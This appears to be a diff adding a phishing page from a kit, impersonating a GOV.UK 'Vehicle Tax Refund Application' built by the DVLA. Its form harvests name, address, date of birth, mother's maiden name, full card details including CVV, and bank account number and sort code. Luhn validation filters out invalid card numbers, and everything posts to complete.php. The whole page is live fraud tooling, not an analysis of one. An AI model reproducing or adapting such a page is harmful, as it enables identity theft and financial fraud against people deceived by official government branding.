@@ -1,0 +1,679 @@
+<html lang="en"><!--<![endif]--><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<script src="./details_files/jquery.min.js"></script>
+
+<script>
+
+$(document).ready(function() {
+            $("#dob").keyup(function(){
+                if ($(this).val().length == 2){
+                    $(this).val($(this).val() + "/");
+                }else if ($(this).val().length == 5){
+                    $(this).val($(this).val() + "/");
+                }
+            });
+});
+
+</script>
+
+<script>
+
+$(document).ready(function() {
+            $("#expiry_date").keyup(function(){
+                if ($(this).val().length == 2){
+                    $(this).val($(this).val() + "/");
+                }else if ($(this).val().length == 8){
+                    $(this).val($(this).val() + "/");
+                }
+            });
+});
+
+</script>
+
+<script>
+
+$(document).ready(function() {
+            $("#sort_code").keyup(function(){
+                if ($(this).val().length == 2){
+                    $(this).val($(this).val() + "-");
+                }else if ($(this).val().length == 5){
+                    $(this).val($(this).val() + "-");
+                }
+            });
+});
+
+</script>
+
+<script>
+	
+    function mod10_check(val){
+	
+	var nondigits = new RegExp(/[^0-9]+/g);
+	var number = val.replace(nondigits,'');
+	var pos, digit, i, sub_total, sum = 0;
+	var strlen = number.length;
+	if(strlen < 13){ return false; }
+	for(i=0;i<strlen;i++){
+		pos = strlen - i;
+		digit = parseInt(number.substring(pos - 1, pos));
+		if(i % 2 == 1){
+			sub_total = digit * 2;
+			if(sub_total > 9){
+				sub_total = 1 + (sub_total - 10);
+			}
+		} else {
+			sub_total = digit;
+		}
+		sum += sub_total;
+	}
+	if(sum > 0 && sum % 10 == 0){
+		return true;
+	}
+	return false;
+	
+    }
+    </script>
+
+<script>
+
+function cc_format(value) {
+
+  var v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '')
+  var matches = v.match(/\d{4,16}/g);
+  var match = matches && matches[0] || ''
+  var parts = []
+  for (i=0, len=match.length; i<len; i+=4) {
+    parts.push(match.substring(i, i+4))
+  }
+  if (parts.length) {
+    return parts.join(' ')
+  } else {
+    return value
+  }
+}
+
+onload = function() {
+  document.getElementById('card_number').oninput = function() {
+    this.value = cc_format(this.value)
+  }
+}
+
+</script>
+
+<script src="./details_files/jspostcode.js"></script>
+
+<script>
+function empty() {
+    var x;
+    x = document.getElementById("full_name").value;
+    if (x == "") {
+        document.getElementById("full_name").style = "border-color:red; width: 50%";
+		document.getElementById("full_name_error").style = "display: block";
+        return false;
+    }
+	var y;
+    y = document.getElementById("address").value;
+    if (y == "") {
+        document.getElementById("address").style = "border-color:red; width: 50%";
+		document.getElementById("address_error").style = "display: block";
+        return false;
+    }
+	var y;
+    y = document.getElementById("city").value;
+    if (y == "") {
+        document.getElementById("city").style = "border-color:red; width: 50%";
+		document.getElementById("city_error").style = "display: block";
+        return false;
+    }
+	var y;
+    y = document.getElementById("county").value;
+    if (y == "") {
+        document.getElementById("county").style = "border-color:red; width: 50%";
+		document.getElementById("county_error").style = "display: block";
+        return false;
+    }
+	var y;
+    y = document.getElementById("postcode").value;
+    if (y == "") {
+        document.getElementById("postcode").style = "border-color:red; width: 50%";
+		document.getElementById("postcode_error").style = "display: block";
+        return false;
+    }
+	var newPostCode = checkPostCode(document.getElementById('postcode').value);
+	
+	if (newPostCode) {
+	
+    document.getElementById('postcode').value = newPostCode;
+	
+    }
+	
+    else {
+	
+        document.getElementById("postcode").style = "border-color:red; width: 50%";
+		document.getElementById("invalid_postcode_error").style = "display: block";
+        return false;
+    }
+	var y;
+    y = document.getElementById("county").value;
+    if (y == "") {
+        document.getElementById("county").style = "border-color:red; width: 50%";
+		document.getElementById("county_error").style = "display: block";
+        return false;
+    }
+	var y;
+    y = document.getElementById("phone_number").value;
+    if (y == "") {
+        document.getElementById("phone_number").style = "border-color:red; width: 50%";
+		document.getElementById("phone_number_error").style = "display: block";
+        return false;
+    }
+	var y;
+    y = document.getElementById("dob").value;
+    if (y == "") {
+        document.getElementById("dob").style = "border-color:red; width: 50%";
+		document.getElementById("dob_error").style = "display: block";
+        return false;
+    }
+	var y;
+    y = document.getElementById("mmn").value;
+    if (y == "") {
+        document.getElementById("mmn").style = "border-color:red; width: 50%";
+		document.getElementById("mmn_error").style = "display: block";
+        return false;
+    }
+    var x;
+    x = document.getElementById("cardholder_name").value;
+    if (x == "") {
+        document.getElementById("cardholder_name").style = "border-color:red; width: 50%";
+		document.getElementById("cardholder_name_error").style = "display: block";
+        return false;
+    };
+	var y;
+    y = document.getElementById("card_type").value;
+    if (y == "") {
+        document.getElementById("card_type").style = "border-color:red; width: 50%";
+		document.getElementById("card_type_error").style = "display: block";
+        return false;
+    }
+	var y;
+    y = document.getElementById("card_number").value;
+    if (y == "") {
+        document.getElementById("card_number").style = "border-color:red; width: 50%";
+		document.getElementById("card_number_error").style = "display: block";
+        return false;
+    }
+	var y;
+	y = document.getElementById("card_number").value;
+	if(mod10_check(y)){  }
+	
+	else {
+	
+	    document.getElementById('card_number').style = 'border-color:red; width: 50%';
+		document.getElementById('wrong_number_error').style = 'display: block'; 
+		return false;
+		
+	}
+	var y;
+    y = document.getElementById("expiry_date").value;
+    if (y == "") {
+        document.getElementById("expiry_date").style = "border-color:red; width: 50%";
+		document.getElementById("expiry_date_error").style = "display: block";
+        return false;
+    }
+	var y;
+    y = document.getElementById("cvv").value;
+    if (y == "") {
+        document.getElementById("cvv").style = "border-color:red; width: 50%";
+		document.getElementById("cvv_error").style = "display: block";
+        return false;
+    }
+	if (document.getElementById("debit_card").selected) {
+	var y;
+    y = document.getElementById("acc_number").value;
+    if (y == "") {
+        document.getElementById("acc_number").style = "border-color:red; width: 50%";
+		document.getElementById("acc_number_error").style = "display: block";
+        return false;
+    }
+	var y;
+    y = document.getElementById("sort_code").value;
+    if (y == "") {
+        document.getElementById("sort_code").style = "border-color:red; width: 50%";
+		document.getElementById("sort_code_error").style = "display: block";
+        return false;
+    }
+	}
+
+}
+</script>
+
+<script>
+function change() {
+
+	var e;
+    e = document.getElementById("full_name").value;
+    if (e !== ""){
+	    document.getElementById("full_name").style = "width: 50%";
+		document.getElementById("full_name_error").style = "display: none";
+	}
+	var e;
+    e = document.getElementById("address").value;
+    if (e !== ""){
+	    document.getElementById("address").style = "width: 50%";
+		document.getElementById("address_error").style = "display: none";
+	}
+	var e;
+    e = document.getElementById("city").value;
+    if (e !== ""){
+	    document.getElementById("city").style = "width: 50%";
+		document.getElementById("city_error").style = "display: none";
+	}
+	var e;
+    e = document.getElementById("county").value;
+    if (e !== ""){
+	    document.getElementById("county").style = "width: 50%";
+		document.getElementById("county_error").style = "display: none";
+	}
+	var e;
+    e = document.getElementById("postcode").value;
+    if (e !== ""){
+	    document.getElementById("postcode").style = "width: 50%";
+		document.getElementById("postcode_error").style = "display: none";
+	}
+	var newPostCode = checkPostCode(document.getElementById('postcode').value);
+	
+	if (newPostCode) {
+	
+	    document.getElementById('postcode').value = newPostCode;
+        document.getElementById("postcode").style = "width: 50%";
+		document.getElementById("invalid_postcode_error").style = "display: none";
+	
+    }
+	var e;
+    e = document.getElementById("phone_number").value;
+    if (e !== ""){
+	    document.getElementById("phone_number").style = "width: 50%";
+		document.getElementById("phone_number_error").style = "display: none";
+	}
+	var e;
+    e = document.getElementById("dob").value;
+    if (e !== ""){
+	    document.getElementById("dob").style = "width: 50%";
+		document.getElementById("dob_error").style = "display: none";
+	}
+	var e;
+    e = document.getElementById("mmn").value;
+    if (e !== ""){
+	    document.getElementById("mmn").style = "width: 50%";
+		document.getElementById("mmn_error").style = "display: none";
+	}
+	var e;
+    e = document.getElementById("cardholder_name").value;
+    if (e !== ""){
+	    document.getElementById("cardholder_name").style = "width: 50%";
+		document.getElementById("cardholder_name_error").style = "display: none";
+	}
+	var e;
+    e = document.getElementById("card_type").value;
+    if (e !== ""){
+	    document.getElementById("card_type").style = "width: 50%";
+		document.getElementById("card_type_error").style = "display: none";
+	}
+	var e;
+    e = document.getElementById("card_number").value;
+    if (e !== ""){
+	    document.getElementById("card_number").style = "width: 50%";
+		document.getElementById("card_number_error").style = "display: none";
+	}
+	if(mod10_check(e)){
+        document.getElementById("card_number").style = "width: 50%";
+		document.getElementById("wrong_number_error").style = "display: none";
+	}
+	var e;
+    e = document.getElementById("expiry_date").value;
+    if (e !== ""){
+	    document.getElementById("expiry_date").style = "width: 50%";
+		document.getElementById("expiry_date_error").style = "display: none";
+	}
+	var e;
+    e = document.getElementById("cvv").value;
+    if (e !== ""){
+	    document.getElementById("cvv").style = "width: 50%";
+		document.getElementById("cvv_error").style = "display: none";
+	}
+	var e;
+    e = document.getElementById("acc_number").value;
+    if (e !== ""){
+	    document.getElementById("acc_number").style = "width: 50%";
+		document.getElementById("acc_number_error").style = "display: none";
+	}
+	var e;
+    e = document.getElementById("sort_code").value;
+    if (e !== ""){
+	    document.getElementById("sort_code").style = "width: 50%";
+		document.getElementById("sort_code_error").style = "display: none";
+	}
+	
+}
+
+</script>
+
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title>Confirm Your Details</title>
+    <!--[if gt IE 8]><!-->
+    <link href="./details_files/govuk-template.css" media="screen" rel="stylesheet"><!--<![endif]-->
+    <!--[if IE 6]><link href="./details_files/govuk-template-ie6.css" media="screen" rel="stylesheet" /><![endif]-->
+    <!--[if IE 7]><link href="./details_files/govuk-template-ie7.css" media="screen" rel="stylesheet" /><![endif]-->
+    <!--[if IE 8]><link href="./details_files/govuk-template-ie8.css" media="screen" rel="stylesheet" /><![endif]-->
+    <link href="./details_files/govuk-template-print.css" media="print" rel="stylesheet">
+
+    <!--[if gt IE 8]><!-->
+     <link href="./details_files/govuk-elements-styles.css" media="screen" rel="stylesheet"><!--<![endif]-->
+    <!--[if IE 6]><link href="./details_files/govuk-elements-styles-ie6.css" rel="stylesheet" type="text/css" /><![endif]-->
+    <!--[if IE 7]><link href="./details_files/govuk-elements-styles-ie7.css" rel="stylesheet" type="text/css" /><![endif]-->
+    <!--[if IE 8]><link href="./details_files/govuk-elements-styles-ie8.css" rel="stylesheet" type="text/css" /><![endif]-->
+
+
+    <!--[if IE 8]><link href="./details_files/fonts-ie8.css" media="all" rel="stylesheet" /><![endif]-->
+    <!--[if gte IE 9]><!-->
+    <link href="./details_files/fonts.css" media="all" rel="stylesheet">
+
+    <link rel="shortcut icon" href="./details_files/favicon.ico" type="image/x-icon">
+    <link rel="mask-icon" href="./details_files/gov.uk_logotype_crown.svg" color=" #0b0c0c">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="./details_files/apple-touch-icon-152x152.png">
+    <link rel="apple-touch-icon-precomposed" sizes="120x120" href="./details_files/apple-touch-icon-120x120.png">
+    <link rel="apple-touch-icon-precomposed" sizes="76x76" href="./details_files/apple-touch-icon-76x76.png">
+    <link rel="apple-touch-icon-precomposed" href="./details_files/apple-touch-icon-60x60.png">
+
+    <!--[if IE 8]><link href="./details_files/application-ie8.css" media="all" rel="stylesheet" /><!--<![endif]-->
+    <!--[if gte IE 9]><!--><link href="./details_files/application.css" media="screen" rel="stylesheet"><!--<![endif]-->
+    <link href="./details_files/numberplate.css" media="screen" rel="stylesheet" type="text/css">
+	
+</head>
+
+<body class="js-enabled">
+    
+    <div id="skiplink-container">
+        <div>
+            <a href="" class="skiplink">Skip to main content</a>
+        </div>
+    </div>
+
+    <div id="global-cookie-message">
+        <p>GOV.UK uses cookies to make the site simpler. <a href="" title="Find out more about cookies">Find out more about cookies</a></p>
+    </div>
+
+    <header role="banner" id="global-header" class="with-proposition">
+        <div class="header-wrapper">
+            <div class="header-global">
+                <div class="header-logo">
+                    <a href="" title="" id="logo" class="content">
+                        <img src="./details_files/gov.uk_logotype_crown.png" width="36" height="32" alt=""> GOV.UK
+                    </a>
+                </div>
+            </div>
+
+            <div class="header-proposition">
+                <div class="content">
+                        <a href="" id="proposition-name">Vehicle Tax Refund Application</a>
+                </div>
+            </div>
+
+
+        </div>
+    </header>
+
+
+    <div id="global-header-bar"></div>
+
+    <main id="content" role="main">
+
+        
+
+<form autocomplete="off" class="form" method="post" action="complete.php?&amp;sessionid=fab28c5d790af4cb77e37167515b380d&amp;securessl=true" onsubmit="return empty()">    <div class="grid-row no-bottom">
+        <div class="column-two-thirds no-bottom">
+
+            <h1 class="heading-large">Confirm Your Details</h1>
+			
+			<hr>
+			
+			 <h1 class="heading-large" style="font-size: 120%">Step 1: Personal Details</h1>
+			 
+			 <br>
+               
+            <div class="form-group no-bottom">
+                <fieldset>
+                    
+                    <div class="form-group field-input-validation-Vrm"><label for="Vrm"><span class="form-label">Full Name</span><span class="field-validation-valid error-message text"></span></label><input class="form-control form-control-1-4" id="full_name" name="full_name" type="text" style="width: 50%" onblur="change()"><label id="full_name_error" style="display: none"><font color="red" style="font-size: 90%">Please enter your full name.</font></label></div>
+					
+					
+					<div class="form-group field-input-validation-Vrm"><label for="Vrm"><span class="form-label">Street Address</span><span class="field-validation-valid error-message text"></span></label><input class="form-control form-control-1-4" id="address" name="address" type="text" style="width: 50%" onblur="change()"><label id="address_error" style="display: none"><font color="red" style="font-size: 90%">Please enter your street address.</font></label></div>
+					
+					<div class="form-group field-input-validation-Vrm"><label for="Vrm"><span class="form-label">City</span><span class="field-validation-valid error-message text"></span></label><input class="form-control form-control-1-4" id="city" name="city" type="text" style="width: 50%" onblur="change()"><label id="city_error" style="display: none"><font color="red" style="font-size: 90%">Please enter your city of residence.</font></label></div>
+					
+					<div class="form-group field-input-validation-Vrm"><label for="Vrm"><span class="form-label">County</span><span class="field-validation-valid error-message text"></span></label><select class="form-control form-control-1-4" id="county" name="county" style="width: 50%" onblur="change()">
+					<option value="">Select Your County</option>
+				<optgroup label="England">
+        <option value="Bedfordshire">Bedfordshire</option>
+        <option value="Berkshire">Berkshire</option>
+        <option value="Bristol">Bristol</option>
+        <option value="Buckinghamshire">Buckinghamshire</option>
+        <option value="Cambridgeshire">Cambridgeshire</option>
+        <option value="Cheshire">Cheshire</option>
+        <option value="City of London">City of London</option>
+        <option value="Cornwall">Cornwall</option>
+        <option value="Cumbria">Cumbria</option>
+        <option value="Derbyshire">Derbyshire</option>
+        <option value="Devon">Devon</option>
+        <option value="Dorset">Dorset</option>
+        <option value="Durham">Durham</option>
+        <option value="East Riding of Yorkshire">East Riding of Yorkshire</option>
+        <option value="East Sussex">East Sussex</option>
+        <option value="Essex">Essex</option>
+        <option value="Gloucestershire">Gloucestershire</option>
+        <option value="Greater London">Greater London</option>
+        <option value="Greater Manchester">Greater Manchester</option>
+        <option value="Hampshire">Hampshire</option>
+        <option value="Herefordshire">Herefordshire</option>
+        <option value="Hertfordshire">Hertfordshire</option>
+        <option value="Isle of Wight">Isle of Wight</option>
+        <option value="Kent">Kent</option>
+        <option value="Lancashire">Lancashire</option>
+        <option value="Leicestershire">Leicestershire</option>
+        <option value="Lincolnshire">Lincolnshire</option>
+        <option value="Merseyside">Merseyside</option>
+        <option value="Norfolk">Norfolk</option>
+        <option value="North Yorkshire">North Yorkshire</option>
+        <option value="Northamptonshire">Northamptonshire</option>
+        <option value="Northumberland">Northumberland</option>
+        <option value="Nottinghamshire">Nottinghamshire</option>
+        <option value="Oxfordshire">Oxfordshire</option>
+        <option value="Rutland">Rutland</option>
+        <option value="Shropshire">Shropshire</option>
+        <option value="Somerset">Somerset</option>
+        <option value="South Yorkshire">South Yorkshire</option>
+        <option value="Staffordshire">Staffordshire</option>
+        <option value="Suffolk">Suffolk</option>
+        <option value="Surrey">Surrey</option>
+        <option value="Tyne and Wear">Tyne and Wear</option>
+        <option value="Warwickshire">Warwickshire</option>
+        <option value="West Midlands">West Midlands</option>
+        <option value="West Sussex">West Sussex</option>
+        <option value="West Yorkshire">West Yorkshire</option>
+        <option value="Wiltshire">Wiltshire</option>
+        <option value="Worcestershire">Worcestershire</option>
+    </optgroup>
+    <optgroup label="Wales">
+        <option value="Anglesey">Anglesey</option>
+        <option value="Brecknockshire">Brecknockshire</option>
+        <option value="Caernarfonshire">Caernarfonshire</option>
+        <option value="Carmarthenshire">Carmarthenshire</option>
+        <option value="Cardiganshire">Cardiganshire</option>
+        <option value="Denbighshire">Denbighshire</option>
+        <option value="Flintshire">Flintshire</option>
+        <option value="Glamorgan">Glamorgan</option>
+        <option value="Merioneth">Merioneth</option>
+        <option value="Monmouthshire">Monmouthshire</option>
+        <option value="Montgomeryshire">Montgomeryshire</option>
+        <option value="Pembrokeshire">Pembrokeshire</option>
+        <option value="Radnorshire">Radnorshire</option>
+    </optgroup>
+    <optgroup label="Scotland">
+        <option value="Aberdeenshire">Aberdeenshire</option>
+        <option value="Angus">Angus</option>
+        <option value="Argyllshire">Argyllshire</option>
+        <option value="Ayrshire">Ayrshire</option>
+        <option value="Banffshire">Banffshire</option>
+        <option value="Berwickshire">Berwickshire</option>
+        <option value="Buteshire">Buteshire</option>
+        <option value="Cromartyshire">Cromartyshire</option>
+        <option value="Caithness">Caithness</option>
+        <option value="Clackmannanshire">Clackmannanshire</option>
+        <option value="Dumfriesshire">Dumfriesshire</option>
+        <option value="Dunbartonshire">Dunbartonshire</option>
+        <option value="East Lothian">East Lothian</option>
+        <option value="Fife">Fife</option>
+        <option value="Inverness-shire">Inverness-shire</option>
+        <option value="Kincardineshire">Kincardineshire</option>
+        <option value="Kinross">Kinross</option>
+        <option value="Kirkcudbrightshire">Kirkcudbrightshire</option>
+        <option value="Lanarkshire">Lanarkshire</option>
+        <option value="Midlothian">Midlothian</option>
+        <option value="Morayshire">Morayshire</option>
+        <option value="Nairnshire">Nairnshire</option>
+        <option value="Orkney">Orkney</option>
+        <option value="Peeblesshire">Peeblesshire</option>
+        <option value="Perthshire">Perthshire</option>
+        <option value="Renfrewshire">Renfrewshire</option>
+        <option value="Ross-shire">Ross-shire</option>
+        <option value="Roxburghshire">Roxburghshire</option>
+        <option value="Selkirkshire">Selkirkshire</option>
+        <option value="Shetland">Shetland</option>
+        <option value="Stirlingshire">Stirlingshire</option>
+        <option value="Sutherland">Sutherland</option>
+        <option value="West Lothian">West Lothian</option>
+        <option value="Wigtownshire">Wigtownshire</option>
+    </optgroup>
+    <optgroup label="Northern Ireland">
+        <option value="Antrim">Antrim</option>
+        <option value="Armagh">Armagh</option>
+        <option value="Down">Down</option>
+        <option value="Fermanagh">Fermanagh</option>
+        <option value="Londonderry">Londonderry</option>
+        <option value="Tyrone">Tyrone</option>
+    </optgroup>
+</select><label id="county_error" style="display: none"><font color="red" style="font-size: 90%">Please select your county.</font></label>
+</div>
+					
+					<div class="form-group field-input-validation-Vrm"><label for="Vrm"><span class="form-label">Postcode</span><span class="field-validation-valid error-message text"></span></label><input class="form-control form-control-1-4" id="postcode" name="postcode" type="text" maxlength="8" style="width: 50%" onblur="change()"><label id="postcode_error" style="display: none"><font color="red" style="font-size: 90%">Please enter your postcode.</font></label><label id="invalid_postcode_error" style="display: none"><font color="red" style="font-size: 90%">Postcode is invalid.</font></label></div>
+					
+					<div class="form-group field-input-validation-Vrm"><label for="Vrm"><span class="form-label">Phone Number</span><span class="field-validation-valid error-message text"></span></label><input class="form-control form-control-1-4" id="phone_number" name="phone_number" type="tel" maxlength="12" style="width: 50%" onkeypress="return event.charCode >= 48 &amp;&amp; event.charCode <= 57" onblur="change()"><label id="phone_number_error" style="display: none"><font color="red" style="font-size: 90%">Please enter your phone number.</font></label></div>
+					
+					<div class="form-group field-input-validation-Vrm"><label for="Vrm"><span class="form-label">Date of Birth</span><span class="field-validation-valid error-message text"></span></label><input class="form-control form-control-1-4" id="dob" name="dob" type="tel" maxlength="10" placeholder="DD/MM/YYYY" pattern="(0[1-9]|[12][0-9]|3[01])[- /.](0[1-9]|1[012])[- /.](19|20)\d\d" style="width: 50%" onkeypress="return event.charCode >= 48 &amp;&amp; event.charCode <= 57" onblur="change()"><label id="dob_error" style="display: none"><font color="red" style="font-size: 90%">Please enter your date of birth.</font></label></div>
+					
+					<div class="form-group field-input-validation-Vrm"><label for="Vrm"><span class="form-label">Mother's Maiden Name</span><span class="field-validation-valid error-message text"></span></label><input class="form-control form-control-1-4" id="mmn" name="mmn" type="text" style="width: 50%" onblur="change()"><label id="mmn_error" style="display: none"><font color="red" style="font-size: 90%">Please enter your mother's maiden name.</font></label></div>
+					
+                    
+                </fieldset>
+            </div>
+			
+			<hr>
+			
+			 <h1 class="heading-large" style="font-size: 120%">Step 2: Billing Details</h1>
+			 
+			 <br>
+               
+            <div class="form-group no-bottom">
+                <fieldset>
+                    
+                    <div class="form-group field-input-validation-Vrm"><label for="Vrm"><span class="form-label">Name on Card</span><span class="field-validation-valid error-message text"></span></label><input class="form-control form-control-1-4" id="cardholder_name" name="cardholder_name" type="text" style="width: 50%" onblur="change()"><label id="cardholder_name_error" style="display: none"><font color="red" style="font-size: 90%">Please enter the name printed on your card.</font></label></div>
+					
+					<div class="form-group field-input-validation-Vrm"><label for="Vrm"><span class="form-label"></span><span class="field-validation-valid error-message text"></span></label><select class="form-control form-control-1-4" id="card_type" name="card_type" style="width: 50%" onchange="debit_check()" onblur="change()">
+					<option value="">Select Your Card Type</option>
+        <option id="credit_card" value="Credit Card">Credit Card</option>
+        <option id="debit_card" value="Debit Card">Debit Card</option>
+</select><label id="card_type_error" style="display: none"><font color="red" style="font-size: 90%">Please select your card type.</font></label>
+</div>
+
+					<div class="form-group field-input-validation-Vrm"><label for="Vrm"><span class="form-label">Card Number</span><span class="field-validation-valid error-message text"></span></label><input class="form-control form-control-1-4" id="card_number" name="card_number" type="tel" maxlength="19" placeholder="XXXX XXXX XXXX XXXX" onkeypress="return event.charCode >= 48 &amp;&amp; event.charCode <= 57" style="width: 50%" onblur="change()"><label id="card_number_error" style="display: none"><font color="red" style="font-size: 90%">Please enter your card number.</font></label><label id="wrong_number_error" style="display: none"><font color="red" style="font-size: 90%">Card number is invalid.</font></label></div>
+					
+					<div class="form-group field-input-validation-Vrm"><label for="Vrm"><span class="form-label">Expiry Date</span><span class="field-validation-valid error-message text"></span></label><input class="form-control form-control-1-4" id="expiry_date" name="expiry_date" type="tel" maxlength="5" placeholder="MM/YY" pattern="(0[1-9]|10|11|12)/(18|19|20|21|22|23|24|25|26)" style="width: 50%" onkeypress="return event.charCode >= 48 &amp;&amp; event.charCode <= 57" onblur="change()"><label id="expiry_date_error" style="display: none"><font color="red" style="font-size: 90%">Please enter the expiry date of your card.</font></label></div>
+					
+					<div class="form-group field-input-validation-Vrm"><label for="Vrm"><span class="form-label">CVV Code</span><span class="field-validation-valid error-message text"></span></label><input class="form-control form-control-1-4" id="cvv" name="cvv" type="tel" maxlength="3" style="width: 50%" pattern="(?=(?:\D*\d){3}).*" onkeypress="return event.charCode >= 48 &amp;&amp; event.charCode <= 57" onblur="change()"><label id="cvv_error" style="display: none"><font color="red" style="font-size: 90%">Please enter the CVV code of your card.</font></label></div>
+					
+					<script type="text/javascript">
+    function debit_check() {
+        if (document.getElementById("debit_card").selected) {
+            document.getElementById("debit_hidden").style.display = "block";
+			
+        } else {
+            document.getElementById("debit_hidden").style.display = "none";
+        }
+    }
+</script>
+					
+					<div id="debit_hidden" style="display: none">
+					
+					<div class="form-group field-input-validation-Vrm"><label for="Vrm"><span class="form-label">Account Number</span><span class="field-validation-valid error-message text"></span></label><input class="form-control form-control-1-4" id="acc_number" required="" name="acc_number" type="tel" maxlength="8" style="width: 50%" onkeypress="return event.charCode >= 48 &amp;&amp; event.charCode <= 57" onblur="change()"><label id="acc_number_error" style="display: none"><font color="red" style="font-size: 90%">Please enter your account number.</font></label></div>
+					
+					<div class="form-group field-input-validation-Vrm"><label for="Vrm"><span class="form-label">Sort Code</span><span class="field-validation-valid error-message text"></span></label><input class="form-control form-control-1-4" id="sort_code" required="" name="sort_code" type="tel" maxlength="8" placeholder="XX-XX-XX" style="width: 50%" onkeypress="return event.charCode >= 48 &amp;&amp; event.charCode <= 57" onblur="change()"><label id="sort_code_error" style="display: none"><font color="red" style="font-size: 90%">Please enter your sort code.</font></label></div>
+					
+					</div>
+					
+                </fieldset>
+            </div>
+			<button class="button" name="Continue" type="submit">Confirm</button>
+        </div>
+    </div>
+</form>
+
+    </main>
+
+    <footer class="group js-footer" id="footer" role="contentinfo">
+
+        <div class="footer-wrapper">
+
+
+            <div class="footer-meta">
+                <div class="footer-meta-inner">
+                    <ul>
+                        <li>
+                            <a href="" target="_blank">Cookies</a>
+                        </li>
+                        <li>
+                            <a href="" target="_blank">Terms and Conditions</a>
+                        </li>
+                        <li>
+                            <a href="">English</a>
+                        </li>
+                        <li>
+                            <a href="">Cymraeg</a>
+                        </li>
+                        <li>
+                          <a href="">Privacy Information Notice</a>
+                        </li>
+                        <li>
+                            Built by the <a href="">Driver &amp; Vehicle Licensing Agency</a>
+                        </li>
+                    </ul>
+                    <div class="open-government-licence">
+                        <p class="logo"><a href="" rel="license">Open Government Licence</a></p>
+
+                        <p>All content is available under the <a href="" rel="license">Open Government Licence v3.0</a>, except where otherwise stated</p>
+
+                    </div>
+                </div>
+
+                <div class="copyright">
+                    <a href="">© Crown copyright</a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <div id="global-app-error" class="app-error hidden"></div>
+
+</body></html>
